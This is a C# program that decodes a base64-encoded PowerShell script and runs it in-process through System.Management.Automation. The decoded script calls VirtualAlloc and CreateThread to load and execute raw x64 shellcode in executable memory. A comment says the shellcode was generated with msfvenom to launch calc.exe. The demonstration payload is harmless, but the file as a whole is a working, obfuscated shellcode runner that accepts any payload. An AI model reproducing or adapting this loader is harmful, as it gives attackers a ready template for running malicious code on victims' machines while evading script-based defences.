using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Text;
using System.Threading.Tasks;

// https://stackoverflow.com/questions/49580045/execute-powershell-script-text-in-c-passing-values-to-arguments-in-param-secti
namespace PSTest
{
    class Program
    {
        static void Main(string[] args)
        {
            String encodedScript = "JGhoc3FvYmR3ID0gQCINCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7DQpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7DQoiQA0KDQokc2pTT0JPWmRtQ3VRQ3ggPSBBZGQtVHlwZSAtbWVtYmVyRGVmaW5pdGlvbiAkaGhzcW9iZHcgLU5hbWUgIldpbjMyIiAtbmFtZXNwYWNlIFdpbjMyRnVuY3Rpb25zIC1wYXNzdGhydQ0KDQpbQnl0ZVtdXSAkS21nWG51dHVDQURGRFJGID0gMHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAsMHgwLDB4MCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwweDU2LDB4NDgsMHgzMSwweGQyLDB4NjUsMHg0OCwweDhiLDB4NTIsMHg2MCwweDQ4LDB4OGIsMHg1MiwweDE4LDB4NDgsMHg4YiwweDUyLDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4ZiwweGI3LDB4NGEsMHg0YSwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4M2MsMHg2MSwweDdjLDB4MiwweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHhkLDB4NDEsMHgxLDB4YzEsMHhlMiwweGVkLDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDEsMHhkMCwweDhiLDB4ODAsMHg4OCwweDAsMHgwLDB4MCwweDQ4LDB4ODUsMHhjMCwweDc0LDB4NjcsMHg0OCwweDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsMHg4OCwweDQ4LDB4MSwweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHhkLDB4NDEsMHgxLDB4YzEsMHgzOCwweGUwLDB4NzUsMHhmMSwweDRjLDB4MywweDRjLDB4MjQsMHg4LDB4NDUsMHgzOSwweGQxLDB4NzUsMHhkOCwweDU4LDB4NDQsMHg4YiwweDQwLDB4MjQsMHg0OSwweDEsMHhkMCwweDY2LDB4NDEsMHg4YiwweGMsMHg0OCwweDQ0LDB4OGIsMHg0MCwweDFjLDB4NDksMHgxLDB4ZDAsMHg0MSwweDhiLDB4NCwweDg4LDB4NDgsMHgxLDB4ZDAsMHg0MSwweDU4LDB4NDEsMHg1OCwweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksMHg1YSwweDQ4LDB4OGIsMHgxMiwweGU5LDB4NTcsMHhmZiwweGZmLDB4ZmYsMHg1ZCwweDQ4LDB4YmEsMHgxLDB4MCwweDAsMHgwLDB4MCwweDAsMHgwLDB4MCwweDQ4LDB4OGQsMHg4ZCwweDEsMHgxLDB4MCwweDAsMHg0MSwweGJhLDB4MzEsMHg4YiwweDZmLDB4ODcsMHhmZiwweGQ1LDB4YmIsMHhlMCwweDFkLDB4MmEsMHhhLDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsMHhkNSwweDQ4LDB4ODMsMHhjNCwweDI4LDB4M2MsMHg2LDB4N2MsMHhhLDB4ODAsMHhmYiwweGUwLDB4NzUsMHg1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLDB4MCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDYzLDB4NjEsMHg2YywweDYzLDB4MmUsMHg2NSwweDc4LDB4NjUsMHgwDQoNCg0KJFdpSW9sblhNb09uSkxrID0gJHNqU09CT1pkbUN1UUN4OjpWaXJ0dWFsQWxsb2MoMCxbTWF0aF06Ok1heCgkS21nWG51dHVDQURGRFJGLkxlbmd0aCwweDEwMDApLDB4MzAwMCwweDQwKQ0KDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRLbWdYbnV0dUNBREZEUkYsMCwkV2lJb2xuWE1vT25KTGssJEttZ1hudXR1Q0FERkRSRi5MZW5ndGgpDQoNCiRzalNPQk9aZG1DdVFDeDo6Q3JlYXRlVGhyZWFkKDAsMCwkV2lJb2xuWE1vT25KTGssMCwwLDApDQo=";
            // msfvenom -p windows/x64/exec CMD=calc.exe --platform windows -a x64 -e cmd/powershell_base64 -f psh EXITFUNC=thread VERBOSE=true | base64 -w 0

            byte[] data = Convert.FromBase64String(encodedScript);
            string decodedString = Encoding.UTF8.GetString(data);

            using (PowerShell powerShellInstance = PowerShell.Create(RunspaceMode.NewRunspace))
            {
                powerShellInstance.AddScript(decodedString);
                Collection<PSObject> PSOutput = powerShellInstance.Invoke();

                foreach (PSObject outputItem in PSOutput)
                {

                    if (outputItem != null)
                    {
                        Console.WriteLine(outputItem);
                    }
                }
                Console.ReadKey();

            }
        }
    }
}
